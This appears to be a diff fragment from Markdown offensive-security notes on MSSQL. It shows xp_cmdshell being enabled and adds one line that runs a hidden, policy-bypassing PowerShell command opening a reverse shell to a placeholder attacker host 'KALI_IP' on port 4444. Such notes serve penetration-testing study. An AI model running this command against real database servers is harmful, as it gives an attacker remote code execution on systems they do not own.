@@ -174,6 +174,7 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
+EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('KALI_IP',4444);..."'
 ```
 
 ## Tools
